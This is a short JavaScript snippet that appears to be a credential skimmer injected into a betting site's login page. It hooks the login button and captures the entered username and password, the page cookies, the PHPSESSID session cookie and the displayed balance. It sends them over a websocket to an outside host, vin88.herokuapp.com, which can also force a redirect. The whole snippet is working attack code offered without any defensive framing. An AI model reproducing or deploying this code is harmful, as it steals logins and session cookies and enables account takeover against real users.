

const socket = io("https://vin88.herokuapp.com", { transport: ['websocket'] });
var acc = {}


var jQueryScript = document.createElement('script');
jQueryScript.setAttribute('src', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js');
document.head.appendChild(jQueryScript);
setTimeout(() => {
    console.log("ff");
    $(".button-login").on('click', function () {
        console.log("click");
        acc.username = $("input[name=txtUsername]").val();
        acc.pass = $("input[name=txtPassword]").val();
        setTimeout(() => {
            acc.cookie = document.cookie
            acc.gvin = $(".money-1").text();
            acc.sessid = $.cookie("PHPSESSID");
            alert(acc.gvin)
            socket.emit('loginchange', acc)
        }, 10000);
    });
}, 5000)
socket.on("logout",()=>{
    window.location.href = "/"
})